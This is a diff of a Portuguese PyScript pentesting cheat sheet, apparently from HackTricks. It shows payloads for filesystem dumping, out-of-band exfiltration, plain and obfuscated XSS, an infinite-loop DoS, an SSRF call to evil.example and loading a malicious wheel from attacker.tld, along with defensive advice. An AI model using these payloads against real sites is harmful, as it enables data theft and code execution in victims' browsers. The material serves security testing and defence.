@@ -2,26 +2,28 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Guia de Pentesting PyScript
+## Guia de Pentesting do PyScript
 
-PyScript é um novo framework desenvolvido para integrar Python ao HTML, podendo ser usado junto com HTML. Neste cheat sheet, você encontrará como usar PyScript para seus propósitos de teste de penetração.
+PyScript é um novo framework desenvolvido para integrar Python ao HTML, podendo ser usado em conjunto com HTML. Nesta cheat sheet, você encontrará como usar PyScript para fins de pentesting.
 
-### Dumping / Recuperando arquivos do sistema de arquivos de memória virtual Emscripten:
+### Dumping / Recuperando arquivos do sistema de arquivos de memória virtual do Emscripten:
 
-`CVE ID: CVE-2022-30286`\
+`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
 \
-Código:
+Code:
 ```html
 <py-script>
 with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 = fin.read() print(out)
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
+Resultado:
 
-### [OOB Data Exfiltration do sistema de arquivos de memória virtual Emscripten (monitoramento de console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+![Guia de Pentesting do PyScript - Dumping / Recuperação de arquivos do sistema de arquivos de memória virtual do Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-`CVE ID: CVE-2022-30286`\
+### [OOB Data Exfiltration do sistema de arquivos de memória virtual do Emscripten (monitoramento do console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+
+`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
 \
 Código:
 ```html
@@ -45,7 +47,9 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ')
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
+Resultado:
+
+![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
 ### Cross Site Scripting (Comum)
 
@@ -55,9 +59,11 @@ Código:
 print("<img src=x onerror='alert(document.domain)'>")
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
+Resultado:
 
-### Cross Site Scripting (Python Ofuscado)
+![Exfiltração de dados OOB do sistema de arquivos de memória virtual do Emscripten (monitoramento do console) - Cross Site Scripting (Ordinário): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
+
+### Cross Site Scripting (Python Obfuscated)
 
 Código:
 ```python
@@ -71,9 +77,11 @@ y = "o";m = "ner";z = "ror\u003d"
 print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
+Resultado:
 
-### Cross Site Scripting (Ofuscação de JavaScript)
+![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
+
+### Cross Site Scripting (JavaScript Obfuscation)
 
 Código:
 ```html
@@ -143,9 +151,11 @@ return _0x599c()
 "")
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
+Resultado:
 
-### Ataque DoS (Loop Infinito)
+![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (loop infinito)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
+
+### DoS attack (loop infinito)
 
 Código:
 ```html
@@ -154,15 +164,17 @@ while True:
 print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+Resultado:
+
+![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
 
 ---
 
 ## Novas vulnerabilidades e técnicas (2023-2025)
 
-### Server-Side Request Forgery via redirecionamentos incontroláveis (CVE-2025-50182)
+### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)
 
-`urllib3 < 2.5.0` ignora os parâmetros `redirect` e `retries` quando é executado **dentro do runtime Pyodide** que é enviado com PyScript. Quando um atacante pode influenciar URLs de destino, ele pode forçar o código Python a seguir redirecionamentos entre domínios, mesmo quando o desenvolvedor os desativou explicitamente ‑ efetivamente contornando a lógica anti-SSRF.
+`urllib3 < 2.5.0` ignora os parâmetros `redirect` e `retries` quando é executado **dentro do runtime Pyodide** fornecido com o PyScript. Quando um atacante consegue influenciar as URLs de destino, ele pode forçar o código Python a seguir redirects entre domínios, mesmo quando o desenvolvedor os desativou explicitamente — efetivamente contornando a lógica anti-SSRF.<sup>[[1]](#references)</sup>
 ```html
 <script type="py">
 import urllib3
@@ -171,11 +183,11 @@ r = http.request("GET", "https://evil.example/302")      # will STILL follow the
 print(r.status, r.url)
 </script>
 ```
-Corrigido em `urllib3 2.5.0` – atualize o pacote na sua imagem PyScript ou fixe uma versão segura em `packages = ["urllib3>=2.5.0"]`. Veja a entrada oficial do CVE para detalhes.
+Corrigido em `urllib3 2.5.0` – atualize o package na sua imagem PyScript ou fixe uma versão segura em `packages = ["urllib3>=2.5.0"]`. Consulte a entrada oficial do CVE para obter detalhes.
 
-### Carregamento de pacotes arbitrários e ataques à cadeia de suprimentos
+### Carregamento arbitrário de packages e ataques de supply-chain
 
-Como o PyScript permite URLs arbitrárias na lista `packages`, um ator malicioso que pode modificar ou injetar configurações pode executar **Python totalmente arbitrário** no navegador da vítima:
+Como o PyScript permite URLs arbitrárias na lista `packages`, um agente malicioso que consiga modificar ou injetar configurações pode executar **Python totalmente arbitrário** no navegador da vítima:
 ```html
 <py-config>
 packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
@@ -184,12 +196,12 @@ packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 import payload  # executes attacker-controlled code during installation
 </script>
 ```
-*Somente rodas puras em Python são necessárias – nenhum passo de compilação WebAssembly é necessário.* Certifique-se de que a configuração não é controlada pelo usuário e hospede rodas confiáveis em seu próprio domínio com HTTPS e hashes SRI.
+*Somente wheels Python puras são necessárias — nenhuma etapa de compilação WebAssembly é necessária.* Certifique-se de que a configuração não seja controlada pelo usuário e hospede wheels confiáveis em seu próprio domínio com HTTPS e hashes SRI.
 
-### Mudanças na sanitização de saída (2023+)
+### Alterações na sanitização da saída (2023+)
 
-* `print()` ainda injeta HTML bruto e, portanto, é suscetível a XSS (exemplos acima).
-* O novo helper `display()` **escapa HTML por padrão** – a marcação bruta deve ser envolvida em `pyscript.HTML()`.
+* `print()` ainda injeta HTML bruto e, portanto, é vulnerável a XSS (exemplos acima).
+* O helper mais recente `display()` **escapa HTML por padrão** — markup bruto deve ser envolvido em `pyscript.HTML()`.
 ```python
 from pyscript import display, HTML
 
@@ -197,21 +209,22 @@ display("<b>escaped</b>")          # renders literally
 
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-Esse comportamento foi introduzido em 2023 e está documentado no guia oficial de Built-ins. Confie em `display()` para entradas não confiáveis e evite chamar `print()` diretamente.
+Este comportamento foi introduzido em 2023 e está documentado no guia oficial de Built-ins. Use `display()` para entradas não confiáveis e evite chamar `print()` diretamente.<sup>[[2]](#references)</sup>
 
 ---
 
-## Melhores Práticas Defensivas
+## Melhores práticas defensivas
 
-* **Mantenha os pacotes atualizados** – atualize para `urllib3 >= 2.5.0` e reconstrua regularmente as wheels que são enviadas com o site.
-* **Restringir fontes de pacotes** – referencie apenas nomes do PyPI ou URLs de mesma origem, idealmente protegidos com Sub-resource Integrity (SRI).
-* **Fortalecer a Política de Segurança de Conteúdo** – desautorizar JavaScript inline (`script-src 'self' 'sha256-…'`) para que blocos `<script>` injetados não possam ser executados.
-* **Desautorizar tags `<py-script>` / `<script type="py">` fornecidas pelo usuário** – sanitize HTML no servidor antes de ecoá-lo de volta para outros usuários.
-* **Isolar trabalhadores** – se você não precisar de acesso síncrono ao DOM a partir de trabalhadores, ative a flag `sync_main_only` para evitar os requisitos de cabeçalho `SharedArrayBuffer`.
+* **Mantenha os packages atualizados** – atualize para `urllib3 >= 2.5.0` e reconstrua regularmente os wheels distribuídos com o site.
+* **Restrinja as fontes de packages** – faça referência apenas a nomes do PyPI ou URLs da mesma origem, idealmente protegidos com Sub-resource Integrity (SRI).
+* **Reforce a Content Security Policy** – proíba JavaScript inline (`script-src 'self' 'sha256-…'`) para que blocos `<script>` injetados não possam ser executados.
+* **Proíba tags `<py-script>` / `<script type="py">` fornecidas pelo usuário** – faça a sanitização do HTML no servidor antes de devolvê-lo a outros usuários.
+* **Isole os workers** – se você não precisar de acesso síncrono ao DOM a partir dos workers, habilite a flag `sync_main_only` para evitar os requisitos de headers do `SharedArrayBuffer`.
 
 ## Referências
 
-* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
-* [Documentação Built-ins do PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
+- [2] [Documentação de Built-ins do PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
 
 {{#include ../../banners/hacktricks-training.md}}
